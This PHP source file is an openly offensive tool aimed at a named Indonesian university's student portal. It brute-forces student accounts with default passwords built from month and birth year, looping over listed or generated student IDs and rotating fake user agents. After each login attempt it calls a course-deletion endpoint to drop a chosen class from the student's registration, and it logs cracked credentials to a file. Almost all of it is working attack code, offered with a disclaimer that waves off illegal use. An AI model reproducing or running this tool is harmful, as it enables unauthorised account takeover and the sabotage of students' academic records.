 <?php
/**************************************
 * 
 * Multi Brute KRS - sia.uty.ac.id
 * Coded by ./SultanZio 
 * https://sultanzio.github.io/
 *-------------------------------------
 *
 * root@baguslindu : ./Insecure
 * Facebook    : https://fb.com/www.linux.org
 * Github      : https://github.com/sultanzio
 * Instagram   : @baguslindu_
 * 
 * 
 * Disclaimer : 
 * Penggunaan illegal bukan tanggung jawab pembuat tools, alat ini dibuat karena bug yg saya 
 * temukan sudah dipatch puskom karena bocor disemua kelas, alasan dibuat karena 
 * karena saya telat bayar SPP tunggakan hwhw, ini bug default password, work disemua jurusan UTY.
 * 
 * How to use -->
 * Windows User         : Install Xampp > Open CMD > cd C:/Xampp/php > php.exe tools.php
 * Linux Debian Based   : sudo apt install php > php tools.php
 * **************************************/


// No special & effective code, but free to develop
//Bypass Captha Sia
function jumlah()
{
    preg_match('#<p style="color:white">(.*?)</p>#', isset($reqlogin), $oke);
    $get0 = isset($oke[0][0]);
    $get1 = isset($oke[0][1]);
    //Array To Strings
    $int0 = (int) $get0;
    $int1 = (int) $get1;
    //Addition From Array
    $add  = $int0 + $int1;
}

//Random User-Agent
function getUserAgent()
{
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
    $userAgentArray[] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0";
    $userAgentArray[] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
    $userAgentArray[] = "Mozilla/5.0 (iPad; CPU OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0";
    $userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38";
    $userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
    $userAgentArray[] = "Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36";
    
    $getArrayKey = array_rand($userAgentArray);
    return $userAgentArray[$getArrayKey];
    
}



// Code
print "*Disclaimer : Penggunaan illegal bukan tanggung jawab pembuat tools\n";
print "===================================================================\n";
print "= With two mode : from list & from nim (read the code)\n";
print "===================================================================\n\n";
print "1. Mode list dari teks\n";
print "2. Mode NIM rentang\n";
$mode = (int)readline('[x] Pilih Mode : ');
echo "Rentang tahun digunakan sebagai password, ex: 2000 - 2002\n";
$thn1 = readline('[x] Rentang Tahun 1 : ');
$thn2 = readline('[x] Rentang Tahun 2 : ');
$kodekls = readline('[x] Masukan Code Kelas yg Akan dihapus : ');


switch ($mode) {
    case 1:
        for ($j = 1; $j <= 12; ++$j) {
    $passw = str_pad($j, 2, "0", STR_PAD_LEFT);
    for($x = $thn1; $x <= $thn2; ++$x){
        
        
        // USE Your List Nim
        if ($file = fopen("list.txt", "r")) {
            while (!feof($file)) {
                $line = fgets($file);
                $nik  = $line;
                $pass = $passw.$x;
                
                
                
                /********************************************************************/
                // Curl Request 1 (Login)
                /********************************************************************/
                $loginsite    = "https://sia.uty.ac.id";
                $curllogin    = curl_init();
                $getUserAgent = getUserAgent();
                $agent        = $getUserAgent;
                curl_setopt($curllogin, CURLOPT_USERAGENT, $agent);
                curl_setopt($curllogin, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($curllogin, CURLOPT_URL, $loginsite);
                curl_setopt($curllogin, CURLOPT_POST, true);
                curl_setopt($curllogin, CURLOPT_COOKIEJAR, "cookie.txt");
                curl_setopt($curllogin, CURLOPT_POSTFIELDS, $datamasuk = array(
                    'loginNipNim' => "$nik",
                    'loginPsw' => "$pass",
                    'mumet' => jumlah() 
                ));
                curl_setopt($curllogin, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($curllogin, CURLOPT_REFERER, "https://www.sia.uty.ac.id");
                
                $reqlogin = curl_exec($curllogin);
                curl_close($curllogin);
                preg_match_all('/static\">(.*?)<\/p>/', $reqlogin, $res);
                
                

                /********************************************************************/
                // Curl Request 2 (Delete Class)
                /********************************************************************/
                $loginsite2   = "https://sia.uty.ac.id/std/krsdel/true";
                $curllogin2   = curl_init();
                $getUserAgent = getUserAgent();
                $agent        = $getUserAgent;
                curl_setopt($curllogin2, CURLOPT_USERAGENT, $agent);
                curl_setopt($curllogin2, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($curllogin2, CURLOPT_URL, $loginsite2);
                curl_setopt($curllogin2, CURLOPT_POSTFIELDS, $delete = array(
                    'btn' => "$kodekls"
                ));
                curl_setopt($curllogin2, CURLOPT_COOKIEFILE, "cookie.txt");
                curl_setopt($curllogin2, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($curllogin2, CURLOPT_REFERER, "https://www.sia.uty.ac.id/std/krs");
                $reqlogin2 = curl_exec($curllogin2);
                curl_close($curllogin2);
                
                
                If (!empty($res[1])) {
                    
                    //  Do you want save login and password??
                     $simpan = json_encode($res[1][0]);
                     $files = fopen("berhasil.txt","a");
                     fwrite($files, "NIM : ".$res[1][0]." Password : ".$pass."\n");
                     fclose($files);
                    print "\n[+] Process, NIM " . $res[1][0] . " Nama : " . $res[1][1]."Pass : ".$pass ;

                    
                } else {
                    print "\n[-] Gagal Bruh Pass : ".$pass;
                }         
            }
        }    
    }
    
} fclose($file); 
        break;
    

case 2:
for ($i = 1; $i <= 500; ++$i) {
$numb= str_pad($i, 3, "0", STR_PAD_LEFT);
        for ($j = 1; $j <= 12; ++$j) {
    $passw = str_pad($j, 2, "0", STR_PAD_LEFT);
    for($x = $thn1; $x <= $thn2; ++$x){
        
                $prodi = 5190411; //---------------------------------------> CHANGE YOUR MAJOR (Ganti no jurusanmu)
                $nik  = $prodi.$numb;
                $pass = $passw.$x;
                
                
                /********************************************************************/
                // Curl Request 1 (Login)
                /********************************************************************/
                $loginsite    = "https://sia.uty.ac.id";
                $curllogin    = curl_init();
                $getUserAgent = getUserAgent();
                $agent        = $getUserAgent;
                curl_setopt($curllogin, CURLOPT_USERAGENT, $agent);
                curl_setopt($curllogin, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($curllogin, CURLOPT_URL, $loginsite);
                curl_setopt($curllogin, CURLOPT_POST, true);
                curl_setopt($curllogin, CURLOPT_COOKIEJAR, "cookie.txt");
                curl_setopt($curllogin, CURLOPT_POSTFIELDS, $datamasuk = array(
                    'loginNipNim' => "$nik",
                    'loginPsw' => "$pass",
                    'mumet' => jumlah() 
                ));
                curl_setopt($curllogin, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($curllogin, CURLOPT_REFERER, "https://www.sia.uty.ac.id");
                
                $reqlogin = curl_exec($curllogin);
                curl_close($curllogin);
                preg_match_all('/static\">(.*?)<\/p>/', $reqlogin, $res);
                
                

                /********************************************************************/
                // Curl Request 2 (Delete Class)
                /********************************************************************/
                $loginsite2   = "https://sia.uty.ac.id/std/krsdel/true";
                $curllogin2   = curl_init();
                $getUserAgent = getUserAgent();
                $agent        = $getUserAgent;
                curl_setopt($curllogin2, CURLOPT_USERAGENT, $agent);
                curl_setopt($curllogin2, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($curllogin2, CURLOPT_URL, $loginsite2);
                curl_setopt($curllogin2, CURLOPT_POSTFIELDS, $delete = array(
                    'btn' => "$kodekls"
                ));
                curl_setopt($curllogin2, CURLOPT_COOKIEFILE, "cookie.txt");
                curl_setopt($curllogin2, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($curllogin2, CURLOPT_REFERER, "https://www.sia.uty.ac.id/std/krs");
                $reqlogin2 = curl_exec($curllogin2);
                curl_close($curllogin2);
                
                
                If (!empty($res[1])) {
                    
                    //  Do you want save login and password??
                     $simpan = json_encode($res[1][0]);
                     $files = fopen("berhasil.txt","a");
                     fwrite($files, "NIM : ".$res[1][0]." Password : ".$pass."\n");
                     fclose($files);
                    print "\n[+] Process, NIM " . $res[1][0] . " Nama : " . $res[1][1]."Pass : ".$pass ;

                    
                } else {
                    print "\n[-] Gagal Bruh Pass : ".$pass;
                }         
            }
        }    
    } fclose($file); 
    break;
    default:
        print "Masukan angka dengan benar!";
} 
    
?> 
